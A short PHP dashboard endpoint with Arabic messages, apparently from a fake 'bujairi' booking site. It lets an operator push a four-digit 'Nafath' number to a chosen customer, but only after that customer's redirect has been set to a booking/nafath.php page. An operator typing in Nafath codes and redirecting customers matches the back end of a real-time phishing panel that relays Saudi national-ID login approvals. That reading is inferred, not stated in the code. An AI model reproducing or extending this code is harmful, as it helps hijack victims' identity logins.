<?php
declare(strict_types=1);

session_start();
require_once __DIR__ . '/init.php';

header('Content-Type: application/json; charset=utf-8');

if (!isset($_POST['user_id'], $_POST['number'])) {
    echo json_encode(['success' => false, 'error' => 'بيانات مفقودة'], JSON_UNESCAPED_UNICODE);
    exit;
}

$userId = (int) $_POST['user_id'];
$number = trim((string) $_POST['number']);

if ($number === '') {
    echo json_encode(['success' => false, 'error' => 'الرقم فارغ'], JSON_UNESCAPED_UNICODE);
    exit;
}

if (!preg_match('/^\d{1,4}$/', $number)) {
    echo json_encode(['success' => false, 'error' => 'أدخل رقماً صالحاً (حتى 4 أرقام)'], JSON_UNESCAPED_UNICODE);
    exit;
}

$email = function_exists('bujairi_dashboard_email_for_user_id')
    ? bujairi_dashboard_email_for_user_id($userId)
    : '';

if ($email === '') {
    echo json_encode(['success' => false, 'error' => 'لا يوجد بريد للعميل'], JSON_UNESCAPED_UNICODE);
    exit;
}

try {
    $pdo = dashboard_pdo();
    $st = $pdo->prepare(
        'SELECT client_redirect_url FROM orders WHERE customer_email = ? ORDER BY id DESC LIMIT 1'
    );
    $st->execute([$email]);
    $redir = $st->fetchColumn();
    $redir = $redir !== false && $redir !== null ? trim((string) $redir) : '';
    $okPath = $redir !== ''
        && str_contains(strtolower($redir), 'nafath.php')
        && str_contains($redir, 'booking/');
    if (!$okPath) {
        echo json_encode([
            'success' => false,
            'error' => 'فعّل التوجيه إلى صفحة booking/nafath.php أولاً ثم أرسل الرمز.',
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
} catch (Throwable $e) {
    echo json_encode(['success' => false, 'error' => 'خطأ التحقق من التوجيه'], JSON_UNESCAPED_UNICODE);
    exit;
}

try {
    $result = $User->sendNafathNumber($userId, $number);
    if (!$result) {
        echo json_encode(['success' => false, 'error' => 'فشل الحفظ'], JSON_UNESCAPED_UNICODE);
        exit;
    }

    echo json_encode(['success' => true, 'message' => 'تم الإرسال'], JSON_UNESCAPED_UNICODE);
} catch (Throwable $e) {
    echo json_encode(['success' => false, 'error' => 'خطأ في الخادم'], JSON_UNESCAPED_UNICODE);
}
